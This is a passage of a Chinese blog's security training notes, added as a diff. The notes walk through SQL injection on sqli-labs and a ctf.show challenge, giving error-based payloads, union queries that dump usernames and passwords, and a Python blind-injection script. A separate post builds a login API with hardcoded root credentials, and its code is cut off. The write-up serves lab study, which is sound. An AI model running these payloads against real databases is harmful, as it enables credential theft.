@@ -262,6 +262,198 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-培训笔记21" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/" class="article-date">
+      <time datetime="2023-12-23T14:38:45.000Z" itemprop="datePublished">2023-12-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B021/">SQL注入之盲注型,报错型，postman软件的使用</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="SQL数字型注入"><a href="#SQL数字型注入" class="headerlink" title="SQL数字型注入"></a>SQL数字型注入</h2><p>1.打开虚拟机win10hei的phpstudy,开启Apache和Mysql，使用php5.5.9,打开网站，点击sqli,点击下图圈内的数据，初始化数据库。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163695294-5a64ff5b-77a0-4b29-8675-4a840803c65b.png" alt="image.png"><br>2.进入第二关，按键盘的F12,点击HackBar,输入<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-2/?id=1">http://192.168.17.128/sqli/Less-2/?id=1</a>，没报错，我们要找的是报错点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703163939662-a60b000d-b674-43cd-b548-dce59af2a3b4.png" alt="image.png"><br>3.查看第二关的代码，发现这关的解法是数字型注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164370988-148029f7-d7ef-4e36-9e3c-6157fb4e515e.png" alt="image.png"><br>4.id&#x3D;1 后面加 order by 4,发现字段没有四列，所以一般是3列。开始查表。和之前的一样的套路，union联合注入<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164620139-6071a896-7eac-4fef-966e-6a004057d5a6.png" alt="image.png"><br>5.查字段名<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164753618-29682902-5766-431f-9374-9cc5c40f5cdd.png" alt="image.png"><br>6.查字段，得到我们想要的结果<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703164848325-261c35f6-89c1-4224-a04a-35ece6a05ef5.png" alt="image.png"><br>7.十种常见的SQL报错函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<h2 id="postman软件的使用"><a href="#postman软件的使用" class="headerlink" title="postman软件的使用"></a>postman软件的使用</h2><p>1.在虚拟机win10hei的火狐浏览器访问老师给的ctf show题目链接：<a target="_blank" rel="noopener" href="http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/">http://2bedbecd-56d1-426b-a35a-4b49deea4522.challenge.ctf.show/</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703250565862-28b7bbad-59cc-49ef-acbd-724e469485b7.png" alt="image.png"><br>2.键入F12，点击网络，点击重新加载，找到API，即名字为v3.php?page&#x3D;1&amp;limit&#x3D;10的文件，复制右边栏GET请求的网址，粘贴到postman的发包框内<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248669523-c7c4f1be-66ab-4b58-96d1-46d603fb61d8.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703248850495-d7e11cf9-0571-4085-9798-f28921ab0d03.png" alt="image.png"><br>3.发送请求方式选择GET,在表格第三行输入id和1，点击send,查询到了id&#x3D;1的用户名和密码。然后找闭合点，在1的后面加单引号，再点击send,发现底栏报错，说明1’是闭合点<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249314650-9f381305-de9f-4f30-a489-2b56eac6392c.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249614803-476ebe29-f994-4f6a-a167-2303e0b9fdb0.png" alt="image.png"><br>4.1’的后面加order by 4 – -判断数据表是否有4列，结果报错，改成order by 3 – -，可以显示数据，说明只有3列<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703249919426-3163c3ca-214a-4385-9ba4-d2896a3a1f18.png" alt="image.png"><br>5.查字段名，把1改成-1，在表格1’后面使用union联合sql语句,和之前的报错型的步骤基本相同<br><code>-1&#39; union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;ctfshow_user3&#39; and table_schema=database();-- -</code><br>6.查字段，在表格1’后面使用union联合sql语句。<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br>因为我们要得到的是username&#x3D;’flag’的密码，所以要删除username,最终为<br><code>-1&#39; union select 1,2,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from ctfshow_user3 ;-- -</code><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251101346-9141a6ac-450d-43e9-aab9-c71acea03323.png" alt="image.png"></p>
+<h2 id="SQL注入之盲注型，布尔"><a href="#SQL注入之盲注型，布尔" class="headerlink" title="SQL注入之盲注型，布尔"></a>SQL注入之盲注型，布尔</h2><p>1.SQL注入理论<br>（1）SQL注入的含义:SQL注入用户通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，网站应用程序未经过过滤，将恶意SQL语句带入数据库进行执行，通过数据库获取了敏感的信息或者执行了其他恶意操作。<br>（2）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168115226-4b84b8d3-1f5f-4290-a0f9-74e0af769592.png" alt="Image.png"><br>（3）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168181264-adbd4c70-64ff-45ed-89b6-ac32390792f9.png" alt="Image.png"><br>（4）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168241171-bb34d4fe-cb99-49d7-a738-c5c391a116af.png" alt="Image.png"><br>（5）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168291828-ac2d160c-5077-4f3f-8fb8-dc62fda8e7f1.png" alt="Image.png"><br>（6）<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703168324049-4b6009f0-0bb3-4989-ade2-120b1de01cd6.png" alt="Image.png"><br>2.<code>id=1&#39;and ascii(substring(database(),1,1))=115--+</code>,根据提供的语句，以sqli的第6关为例，编写一个SQL盲注的python脚本并运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url = &#x27;http://192.168.17.128/sqli/Less-6/?id=1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db():</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        begin = 32</span><br><span class="line">        end = 128</span><br><span class="line">        tmp = (begin + end) // 2</span><br><span class="line">        while begin &lt; end:</span><br><span class="line">            paramsGet = url + &quot;/**/and/**/ascii(substring((select group_concat(id,username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(</span><br><span class="line">                i, tmp)</span><br><span class="line">            response = session.get(paramsGet)</span><br><span class="line">            if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                begin = tmp + 1</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">            else:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin+end) // 2</span><br><span class="line">        if tmp == 32:</span><br><span class="line">            break</span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>分析如下：<br>（1）import requests：导入 requests 模块，用于发送 HTTP 请求。<br>（2）session &#x3D; requests.session()：创建一个 requests 会话（session）对象。<br>（3）url &#x3D; ‘<a target="_blank" rel="noopener" href="http://192.168.17.128/sqli/Less-6/?id=1%22%27%EF%BC%9A%E8%AE%BE%E7%BD%AE%E7%9B%AE%E6%A0%87">http://192.168.17.128/sqli/Less-6/?id=1&quot;&#39;：设置目标</a> URL，其中 id 参数的值为 1”，这里是一个潜在的注入点。<br>（4）利用名为 db 的函数，从数据库中逐个获取字符来构建字符串。代码通过二分法逐个猜测每个字符的 ASCII 值，并通过注入的操作获取其中的数据。<br>3.得到我们想要的字段。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703251885180-214f4be2-1d1f-4ff3-bf33-650e81b2cd4c.png" alt="image.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-培训笔记20" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/" class="article-date">
+      <time datetime="2023-12-23T14:35:16.000Z" itemprop="datePublished">2023-12-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B020/">SQL注入之联合型</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="安装PHP5-5-9，HackBar"><a href="#安装PHP5-5-9，HackBar" class="headerlink" title="安装PHP5.5.9，HackBar"></a>安装PHP5.5.9，HackBar</h2><p>1.打开虚拟机win10hei的PHPstudy，启动Apache和Mtsql，在软件管理的php界面下载php5.5.9，<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080258406-5071209f-9911-44bc-92f1-a2ae9d2f78ae.png" alt="image.png"><br>2.在下图的路径输入cmd,在输入以下命令：</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080376428-d760af2c-e3e8-4399-b3cc-c4642397f8df.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql  -u root -p</span><br><span class="line">show databases；</span><br><span class="line">use security;</span><br><span class="line">show tables;</span><br><span class="line">select 1，2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080560321-32f26f0e-eb22-4eeb-92c0-9eb1a542ffb0.png" alt="Image.png"><br>3.下载火狐插件HackBar 它可以发包。把这个插件安装到浏览器。按键盘上的F12可以唤起它。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080753625-31554e52-90d8-4f13-b926-3d65803c9cff.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080802345-7bdec522-fae3-4bc3-a3c7-47975aa00522.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703080911381-9f3e0491-4687-4014-9a3e-7ff1e1eb5b26.png" alt="image.png"><br>4.information_schema是在mysql5.0之后产生的（面试题考点）</p>
+<h2 id="SQL联合注入步骤"><a href="#SQL联合注入步骤" class="headerlink" title="SQL联合注入步骤"></a>SQL联合注入步骤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">联合(union)的顺序:查表-&gt;查字段名-&gt;查字段</span><br><span class="line"></span><br><span class="line">SQL查表</span><br><span class="line">select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段名</span><br><span class="line">select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();-- -</span><br><span class="line"></span><br><span class="line">SQL查字段</span><br><span class="line">select group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password) from users ;-- -     //这三条语句必记</span><br></pre></td></tr></table></figure>
+
+<p>1.把sqli文件复制到phpstudy的根目录下，使用php5.5.9，打开网站，点击sqli，进入第一关<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703081834980-d182d068-33e3-4409-a6a4-66d6b1d7520b.png" alt="image.png"><br>2.格式：本地地址或虚拟机地址&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;x   union      xxxxxxxxxxxxxxxx    – -<br>注意：x的值为-1或0         – -为SQL的注释<br>3.先判断是否闭合，输入？id&#x3D;1  再点击Excute发包。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703082782269-f4f9e588-7de0-4728-8678-0edc126360bd.png" alt="image.png"><br>4.然后在1后面加 ‘ 发现报错，如图，有5个分号，1和5抵消，2和3抵消，剩下4，说明没有闭合，1’就是我们要找的。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703083424177-f813c2f6-07c8-4ed9-8aa3-eb163abd70ff.png" alt="image.png"><br>5.其次，开始查表，把1改成0，在0’后面加一个空格，然后加union ，在union后面加查表语句  select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database();  这条语句后要加 – -   将后面的内容注释掉。<br>最终语句为<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database();-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084084617-c5a5e408-80ed-4633-8657-172464224c47.png" alt="image.png"><br>6.查字段名，把原来语句的基础上，把查表语句改成查字段语句，然后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database();-- -</code></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703084568983-25426fef-0ad4-4668-92fe-01c31deb7031.png" alt="image.png"><br>7.最后查字段，把原来语句的基础上，把查字段名语句改成查字段语句，在 group_concat(id,”<del>“,username,”</del>“,password)的group前加上     1，      在password）后面加    ,3       最后再完整语句后加上– -<br><code>[http://localhost/sqli/Less-1/?id=0&#39;](http://localhost/sqli/Less-1/?id=0&#39;)  union select 1, group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users ;-- -</code></p>
+<p>8.最终得到我们想要的整列的username和整列的password<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703085525578-5bf71d67-d324-4a38-bec1-a63cdfd5bcc0.png" alt="Image.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-培训笔记19" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/" class="article-date">
+      <time datetime="2023-12-23T14:29:31.000Z" itemprop="datePublished">2023-12-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/23/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B019/">axios和api.php的使用</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="axios的使用"><a href="#axios的使用" class="headerlink" title="axios的使用"></a>axios的使用</h2><p>1.在vscode创建index.php，导入index.js，vue.js，index.js，axios.min.js四个包<br><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1702896649350-83e99bd5-f450-45df-b6bd-191782c72372.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675946/1702896649350-83e99bd5-f450-45df-b6bd-191782c72372.zip%22,%22name%22:%22html%E4%BD%BF%E7%94%A8vue%E6%9D%90%E6%96%99%E5%8C%85.zip%22,%22size%22:396254,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u83b244ba-1d15-4404-ac0b-95d567d07c7%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ue688691f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">html使用vue材料包.zip</a><br>2.（1）编写index.php，写入以下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;login1&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;login2&quot;&gt;</span><br><span class="line">                &lt;i class=&quot;el-icon-reading&quot;&gt;&lt;/i&gt;</span><br><span class="line">                &lt;h1&gt;图书管理系统登录&lt;/h1&gt;</span><br><span class="line">                &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.username&quot; clearable&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.password&quot; clearable show-password&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;el-button type=&quot;primary&quot; @click=&quot;login&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .el-icon-reading &#123;</span><br><span class="line">            font-size: 100px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 20vh;</span><br><span class="line">            width: 20vw;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login1 &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">            align-items: center;</span><br><span class="line">            background-image: url(./img/6.jpg);</span><br><span class="line">            background-repeat: no-repeat;</span><br><span class="line">            background-size: 100% 100%;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            width: 100vw;</span><br><span class="line">            height: 100vh;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        new Vue(&#123;</span><br><span class="line">            el: &#x27;#app&#x27;,</span><br><span class="line">            data: function() &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    visible: false,</span><br><span class="line">                    userData: &#123;</span><br><span class="line">                        username: &#x27;&#x27;,</span><br><span class="line">                        password: &#x27;&#x27;,</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                login: function() &#123;</span><br><span class="line">                    axios.post(&#x27;http://192.168.17.128/api.php&#x27;, this.userData)</span><br><span class="line">                        .then((response) =&gt; &#123;</span><br><span class="line">                                console.log(response);</span><br><span class="line">                                if (response.data.includes(&#x27;success&#x27;)) &#123;</span><br><span class="line">                                    window.location.href = &quot;http://192.168.17.128/zhuye.php&quot;;</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                    this.open4();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line">                &#125;,</span><br><span class="line">                open4: function() &#123;</span><br><span class="line">                    this.$notify.error(&#123;</span><br><span class="line">                        title: &#x27;错误&#x27;,</span><br><span class="line">                        message: &#x27;账号密码错误&#x27;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（2）45到78行使用了axios和数据绑定，我们来进行分析。代码创建了一个Vue实例并绑定到id为”app”的元素上。在data选项中定义了一些数据属性，包括visible、userData和其中的username和password属性。<br>在methods选项中定义了一个名为login的方法。该方法使用Axios发送一个POST请求到”<a target="_blank" rel="noopener" href="http://192.168.17.128/api.php%22%EF%BC%8C%E5%B9%B6%E4%BC%A0%E9%80%92userData%E4%BD%9C%E4%B8%BA%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82%E8%AF%B7%E6%B1%82%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E9%80%9A%E8%BF%87%E5%88%A4%E6%96%AD%E8%BF%94%E5%9B%9E%E7%9A%84%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%22success%22%E6%9D%A5%E7%A1%AE%E5%AE%9A%E7%99%BB%E5%BD%95%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E3%80%82%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%B0%86%E8%B7%B3%E8%BD%AC%E5%88%B0%22http://192.168.2.70/zhuye.php%22%EF%BC%9B%E5%A6%82%E6%9E%9C%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%B0%86%E8%B0%83%E7%94%A8open4%E6%96%B9%E6%B3%95%E3%80%82">http://192.168.17.128/api.php&quot;，并传递userData作为请求的参数。请求成功后，通过判断返回的响应数据中是否包含&quot;success&quot;来确定登录是否成功。如果成功，代码将跳转到&quot;http://192.168.2.70/zhuye.php&quot;；如果失败，将调用open4方法。</a><br>open4方法使用了Vue的$notify方法来显示一个错误通知，通知的标题是”错误”，内容是”账号密码错误”。</p>
+<h2 id="api-php的使用"><a href="#api-php的使用" class="headerlink" title="api.php的使用"></a>api.php的使用</h2><p>1.编写api.php,写入以下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">$link = mysqli_connect(&quot;192.168.17.128&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(json_encode([&#x27;error&#x27; =&gt; &#x27;数据库连接失败！&#x27;]));</span><br><span class="line">mysqli_query($link, &quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$requertPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">$requestMethod = $_SERVER[&#x27;REQUEST_METHOD&#x27;];</span><br><span class="line">if ($requertPath === &#x27;/api.php&#x27; &amp;&amp; $requestMethod === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $inputJSON = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">    $input = json_decode($inputJSON, true);</span><br><span class="line">    if ($input === null) &#123;</span><br><span class="line">        header(&#x27;HTTP/1.1 400 Bad Request&#x27;);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        $username = $input[&#x27;username&#x27;];</span><br><span 